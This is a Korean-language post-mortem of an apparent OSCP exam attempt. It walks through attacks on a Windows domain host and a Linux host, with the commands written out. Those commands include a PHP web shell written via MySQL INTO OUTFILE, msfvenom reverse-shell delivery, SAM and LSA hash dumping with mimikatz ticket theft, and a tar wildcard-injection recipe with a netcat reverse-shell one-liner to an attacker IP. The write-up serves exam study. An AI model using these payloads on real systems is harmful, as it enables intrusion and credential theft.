# OSCP Exam Post-Mortem Summary (오답노트)

---

## 1. 192.168.115.206 (WS26) — AD Set, Windows

### 📌 시험 환경 요약
| 항목 | 내용 |
|---|---|
| **타겟 IP** | 192.168.115.206 |
| **호스트명** | WS26 |
| **도메인** | oscp.exam |
| **역할** | AD Set — Assumed Breach 시작점 |
| **제공 크레덴셜** | `r.andrews` / `BusyOfficeWorker890` |
| **획득 플래그** | `proof.txt` ✅ |

### ✅ 실제 공격 흐름 (성공)

```
[1] Initial Access (Assumed Breach)
    xfreerdp3 /v:192.168.115.206 /u:r.andrews /p:BusyOfficeWorker890
    → 일반 사용자(r.andrews)로 RDP 접속 성공

[2] 내부 열거 (Local Enumeration)
    WinPEAS.bat 실행 → XAMPP 서비스가 높은 권한(NT SERVICE)으로 실행 중인 것을 확인
    → HTTP(80), HTTPS(443), MySQL(3306), MSSQL(1433) 등 다수 포트 오픈 확인

[3] Privilege Escalation — MySQL Outfile → Web Shell
    mysql -u root (패스워드 없음)
    → secure_file_priv 변수가 비어있어 임의 파일 쓰기 가능
    → SELECT '<?php system($_GET["cmd"]); ?>' INTO OUTFILE 'C:/xampp/htdocs/shell.php';
    → XAMPP 웹루트에 PHP 웹셸 업로드 성공

[4] Reverse Shell → SYSTEM 즉시 획득
    msfvenom으로 리버스셸 페이로드(206.exe) 생성 → 칼리에서 nc -nvlp 9999 리스닝
    웹셸 경유 PowerShell wget으로 페이로드 다운로드 후 실행
    → XAMPP 서비스 자체가 높은 권한으로 실행 중이었기 때문에
      별도의 추가 PrivEsc 없이 즉시 NT AUTHORITY\SYSTEM 셸 획득

[5] proof.txt 탈취
    type C:\Users\Administrator\Desktop\proof.txt
    → 4a220663c2e7193b3c2bf43ae621e230
```

### 💡 핵심 교훈
- **XAMPP/WAMP 같은 웹 서비스 스택이 SYSTEM이나 높은 서비스 권한으로 실행 중이면, 웹셸을 올리는 것 자체가 곧 PrivEsc이다.** 별도의 커널 익스플로잇이나 토큰 조작이 필요 없다.
- MySQL root에 패스워드가 없다 → `secure_file_priv` 확인 → INTO OUTFILE 로 웹셸 쓰기는 OSCP 단골 패턴이다.
- SAM/SYSTEM 덤프, Secretsdump 등은 측면이동(Lateral Movement)을 위한 시도였을 뿐, 이 머신의 PrivEsc와는 무관했다. **보고서에 쓸데없는 과정을 넣지 말 것.**

### 🔎 이후 수행한 행동 (측면이동 시도 — 실패)
```
reg save HKLM\SAM sam.save
reg save HKLM\SYSTEM system.save
impacket-secretsdump -sam sam.save -system system.save LOCAL
→ Administrator NTLM 해시 추출: 3b8c1c5424e6ea78c9066d5d1b4ac555
netexec smb 192.168.115.206 -u Administrator -H ... --local-auth --lsa
→ LSA 시크릿 덤프 → 하지만 이후 DC20이나 다른 AD 머신으로의 측면이동에는 실패

mimikatz sekurlsa::tickets → Kerberos TGT/TGS 확보 (WS26$, r.andrews)
net user /domain → 도메인 사용자 목록 확인
net group "Domain Admins" /domain → Administrator, k.freeman, s.tucker, u.gregory
→ 그러나 이 정보들을 활용한 실질적인 DA 권한 획득까지는 도달하지 못함
```

---

## 2. 192.168.115.110 — 독립 타겟, Linux

### 📌 시험 환경 요약
| 항목 | 내용 |
|---|---|
| **타겟 IP** | 192.168.115.110 |
| **OS** | Ubuntu 24.04 LTS (커널 6.8.0-31-generic) |
| **역할** | 독립 타겟 (20pts) |
| **획득 플래그** | `local.txt` ✅ / `proof.txt` ❌ |

### ✅ Initial Access 흐름 (성공 — local.txt 획득)

```
[1] Nmap 스캔
    Open ports: 22(SSH), 873(Rsync), 3306(MySQL)
    (80/443은 closed 상태)

[2] Rsync 열거
    rsync -av rsync://192.168.115.110/backup rsync_shared/
    → .env 파일 발견:
      DB_USER=cloudsite_dev
      DB_PASSWORD=Cs!Dev#2026@Secure
      UPLOAD_DIR=/var/www/cloudsite/uploads

    → seed_db.py 파일 발견:
      sarah / 12345678910 (role: editor)
      admin / CloudAdmin#2024! (role: admin)

[3] SSH 패스워드 재사용
    ssh sarah@192.168.115.110 (패스워드: Cs!Dev#2026@Secure 또는 12345678910)
    → sarah 계정으로 SSH 접속 성공
    → cat local.txt → 4babdb0c465b04d56c3ba2b958a4bb87 ✅
```

### ❌ Privilege Escalation (실패 — 시간 내 미해결)

**내가 시도한 것:**
- LinPEAS 실행 → Dirty Frag (CVE-2026-43284 / CVE-2026-43500) 취약 판정을 보고 커널 익스플로잇에 집착
- 하지만 Dirty Frag 익스플로잇 컴파일/실행에 실패하거나 시간을 과도하게 소모

**정답은 "Cron Job + Tar Wildcard Injection" 이었다! 🎯**

### 🎯 놓친 벡터 분석

LinPEAS 결과에 이미 답이 적혀 있었는데 못 봤다:

**1. Root Cron Job이 주기적으로 실행 중이었다:**
```
/usr/sbin/cron -f -P                    ← cron 데몬 활성화 확인 (PID 1318)
/var/log/site-backup.log                ← 68607 바이트, Aug 15 14:44 에 마지막 업데이트
                                          → 이 로그가 주기적으로 커지고 있었다!
/opt/backup/site-backup.sh              ← 백업 스크립트 (root 권한으로 실행)
```

**2. 쓰기 가능한 디렉토리 (Wildcard Injection 가능):**
```
.env 파일 내용:
  UPLOAD_DIR=/var/www/cloudsite/uploads  ← sarah 유저에게 쓰기 권한 있음!

백업 스크립트(site-backup.sh)의 추정 내용:
  #!/bin/bash
  cd /var/www/cloudsite/uploads
  tar cf /opt/backup/site-backup.tar *   ← 여기서 * 가 와일드카드 인젝션에 취약
```

**3. 해법 — Tar Wildcard Injection (3줄이면 끝):**
```bash
# sarah 계정으로 /var/www/cloudsite/uploads 폴더에서 실행
cd /var/www/cloudsite/uploads

# 1. 리버스셸 스크립트 생성
echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <공격자IP> 4444 >/tmp/f" > shell.sh

# 2. tar의 --checkpoint-action 옵션을 파일명으로 위장
echo "" > "--checkpoint-action=exec=sh shell.sh"
echo "" > "--checkpoint=1"

# 3. 칼리에서 리스너 대기
nc -nvlp 4444
```

**원리:**
- root 크론잡이 `tar cf backup.tar *`를 실행할 때
- 쉘의 glob expansion에 의해 `*`가 디렉토리 내 모든 파일명으로 치환됨
- `--checkpoint-action=exec=sh shell.sh` 라는 파일명이 tar의 **실제 옵션**으로 해석됨
- 결과: tar가 root 권한으로 `shell.sh`를 실행 → root 리버스셸 획득!

### 💡 핵심 교훈

> **LinPEAS가 커널 취약점을 표시해도, 그것이 유일한 벡터가 아닐 수 있다!**
> 커널 익스플로잇에 꽂히기 전에 반드시 확인해야 할 것들:

1. **Cron Job 확인** — `cron.service`가 active running이면 반드시 의심
   - `/etc/crontab`, `/etc/cron.d/`, `/var/spool/cron/` 읽기 시도
   - 로그 파일(`site-backup.log` 등)이 주기적으로 갱신되는지 타임스탬프 확인
2. **쓰기 가능 디렉토리 + 와일드카드 사용 스크립트** — tar, rsync, 7z 등이 `*`를 사용하면 Wildcard Injection 가능
3. **OSCP에서 Tar Wildcard Injection은 단골 기출문제** — 반드시 암기해둘 것

### 🕐 시간 관리 복기
- Dirty Frag에 매달린 시간: 약 1~2시간 추정
- Tar Wildcard Injection이었다면: 3줄 명령어 + 크론잡 대기 5분 = **10분 이내 해결 가능**
- **커널 익스플로잇에 30분 이상 진전이 없으면 즉시 다른 벡터를 찾아볼 것!**

---

## 3. 전체 시험 복기

### 획득 점수 추정
| 타겟 | 최대 점수 | 획득 플래그 | 추정 획득 점수 |
|---|---|---|---|
| AD Set (WS26) — 192.168.115.206 | 40 | proof.txt ✅ | 10~20 (부분점수) |
| AD Set (SRV22/DC20) — 미돌파 | (AD Set 포함) | — | 0 |
| 독립 #1 — 192.168.115.110 | 20 | local.txt ✅ | 10 |
| 독립 #2 — 192.168.115.111 | 20 | — | 미기록 |
| 독립 #3 — 192.168.115.112 | 20 | — | 미기록 |
| **합계** | **100** | | **20~30 추정** |

> **참고:** AD Set은 **전체 도메인 장악(DA 획득)이 완료되어야** 만점(40점)을 받을 수 있다.
> WS26 한 대만 뚫은 것으로는 부분 점수만 인정될 가능성이 높다.

### 다음 시험을 위한 체크리스트
- [ ] **Tar Wildcard Injection** 숙달 — HackTricks, IppSec 영상으로 연습
- [ ] **Cron Job 열거 자동화** — `pspy`를 반드시 전송하여 실시간 프로세스 모니터링
- [ ] **커널 익스플로잇 30분 룰** — 30분 안에 안 되면 다른 벡터로 전환
- [ ] **AD 공격 체인 연습** — Kerberoasting, AS-REP Roasting, DCSync, Silver/Golden Ticket
- [ ] **시간 배분** — AD Set(8h) vs 독립(4h*3) 가 아닌, 쉬운 것부터 점수 확보 전략
